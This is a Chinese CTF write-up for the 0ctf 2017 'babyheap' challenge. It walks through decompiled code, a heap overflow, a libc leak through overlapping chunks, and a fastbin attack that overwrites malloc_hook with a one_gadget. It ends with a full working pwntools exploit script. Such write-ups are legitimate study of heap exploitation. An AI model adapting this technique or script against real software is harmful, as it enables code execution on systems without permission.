---
title: 0ctf2017 babyheap
date: 2020-04-16 22:47:03
tags: pwn
---
这题也算折磨我挺久了，看着师傅们一个个都做出来了，我却一点思路都么得，属实有点慌<!--more-->    
这题就是个典型的fastbin attack,写这篇write-up也作为对于常用fastbin attack攻击思路的学习总结  
首先检查保护   
```shell  
[*] '/home/N0vice/Desktop/BUUCTF/babyheap_0ctf_2017/babyheap_0ctf_2017'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```  
所有保护都开了，got表不可写  
分析伪代码（add等函数我已重命名）  
标准笔记管理系统   
```c  
int sub_CF4()
{
  puts("1. Allocate");
  puts("2. Fill");
  puts("3. Free");
  puts("4. Dump");
  puts("5. Exit");
  return printf("Command: ");
}
```  
```C++  
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char *v4; // [rsp+8h] [rbp-8h]

  v4 = sub_B70();
  while ( 1 )
  {
    menu();
    get_number();
    switch ( off_14F4 )
    {
      case 1uLL:
        add(v4);
        break;
      case 2uLL:
        edit(v4);
        break;
      case 3uLL:
        delete(v4);
        break;
      case 4uLL:
        show(v4);
        break;
      case 5uLL:
        return 0LL;
      default:
        continue;
    }
  }
}
```  
```C++  
void __fastcall add(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = get_number();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(24LL * i + a1) = 1;
        *(a1 + 24LL * i + 8) = v2;
        *(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", i);
      }
      return;
    }
  }
}
```  
使用calloc申请chunk，会将chunk中的内容全部清零  
```C++  
__int64 __fastcall edit(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = get_number();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      printf("Size: ");
      result = get_number();
      v3 = result;
      if ( result > 0 )
      {
        printf("Content: ");
        result = sub_11B2(*(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```  
fill未检查size是否小于add的chunk size，可造成堆溢出  
```C++  
__int64 __fastcall delete(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = get_number();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      *(24LL * v2 + a1) = 0;
      *(24LL * v2 + a1 + 8) = 0LL;
      free(*(24LL * v2 + a1 + 16));
      result = 24LL * v2 + a1;
      *(result + 16) = 0LL;
    }
  }
  return result;
}
```  
指针置零，无UAF  
```cpp  
signed int __fastcall show(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = get_number();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      sub_130F(*(24LL * v2 + a1 + 16), *(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```  
show函数无漏洞  
## 分析  
无UAF，且calloc会对内存进行清空，难以leak  
## 思路  
利用堆溢出，leak出地址，将malloc_hook改one_gadget一把梭，gg  
如何leak呢，我们知道需要一块被free的内存里面存在悬垂指针，然后我们打印出来，就能leak出地址  
但是这里不存在UAF，chunk在free之后和刚calloc的时候都会被清空，那么我们要得到一块已经free，但是里面又存在地址的chunk，这时候我们就要用到这个堆溢出了，改写size，将已经free的chunk包含在没有free的chunk中，让系统以为两块chunk是同一块没有free的chunk，这样show的时候就能将已经free的chunk里的内容leak出来  
梳理一下思路：  
①add 4个chunk，标号0,1,2,3  
②free chunk1，通过edit chunk0，将chunk1的size改为两倍，这样就能将chunk2包含进去  
③add size==2*chunk1，获得了一个包含chunk2的chunk1，size变为原来的两倍  
④通过edit chunk1，将chunk2的size恢复  
⑤free chunk2，此时chunk2的fd指向unsorted bin的地址，同时也是main_arena+88  
⑥打印chunk1，由于chunk1包含了已经free的chunk2，所以可以接收到main_arena+88，计算出libc_base以及malloc_hook的地址  
⑦将free掉的chunk2 add回来，同时add两块大小为0x60的chunk，标号为4，5  
⑧将chunk5 free掉，通过edit chunk4，溢出修改chunk5的fd位为malloc_hook-0x23   
这个时候，bins里长这样  
![](babyheap1.png)  
⑨将chunk5 add回来，再add一次0x60大小的chunk，就能获得一块首地址为malloc_hook-0x23的chunk6   
add一次之后，bins长这样  
![](babyheap2.png)  
add两次之后长这样  
![](babyheap3.png)  
但是现在在heap里看不到最后一个chunk6，因为不相邻  
⑩edit chunk6，因为首地址是malloc_hook-0x23，减去chunk头，距离malloc_hook还有0x13，填充0x13个a，就能改写malloc_hook指向的值，将其改为one_gadget   
⑪随便add一下，调用calloc函数，就能调用malloc_hook，getshell  
## 为什么？  
问:为什么要将chunk2的size恢复？  
答:fastbin有检查，chunk_size必须与相应的fastbin_index匹配  
问:为什么是0x60大小的chunk？为什么是malloc_hook-0x23？
答:我不知道，记住就vans啦  
## exp   
```python  
#!/usr/bin/env python
#coding=utf-8
from pwn import*
import sys
#context.log_level = 'debug'
context.terminal = ['terminator','-x','sh','-c']
binary = './babyheap_0ctf_2017' 
local = 1
if local == 1:
    p=process(binary)
else:
    p=remote("node3.buuoj.cn",28999)
elf=ELF(binary)
libc=elf.libc
def add(size):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(size))
def edit(index,size,content):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(index))
    p.recvuntil("Size: ")
    p.sendline(str(size))
    p.recvuntil("Content: ")
    p.sendline(str(content))
def delete(index):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(index))
def show(index):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(index))

def exp():
    add(0x90) # 0
    add(0x90) # 1
    add(0x90) # 2
    add(0x90) # 3
    delete(1)
    payload = "a"*0x90 + p64(0) + p64(0x141)
    edit(0,len(payload),payload)
    add(0x130) # 1
    payload = "a"*0x90 + p64(0) + p64(0xa1)
    edit(1,len(payload),payload)
    delete(2)
    show(1)
    #gdb.attach(p)
    p.recv(0xa0)
    libc_base = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3c4b78
    log.success("libc_base==>" + hex(libc_base))
    malloc_hook = libc_base + libc.sym['__malloc_hook']
    add(0x90) # 2
    add(0x60) # 4
    add(0x60) # 5
    delete(5)
    payload = "a"*0x60 + p64(0) + p64(0x71) + p64(malloc_hook-0x23)
    edit(4,len(payload),payload)
    add(0x60) # 5
    add(0x60) # 6
    #gdb.attach(p)
    one_gadget = libc_base + 0x4526a
    payload = "a"*0x13 + p64(one_gadget)
    edit(6,len(payload),payload)
    add(0x10)
    p.interactive()
exp()
```  
这个手法虽然看了很多文章，包括这个题wp也看了有很多篇，但是还是有点模模糊糊，不是很明白  
如果有什么说错了的地方，希望师傅们能纠正  
参考链接：  
https://xz.aliyun.com/t/7490  
https://thriumph.top/babyheap-0ctf-2017-fastbin-attack.html   
https://aryb1n.github.io/2018/07/06/0ctf2017-babyheap/  
https://bbs.pediy.com/thread-246786.htm  
https://www.dazhuanlan.com/2019/10/16/5da734c818cb3/  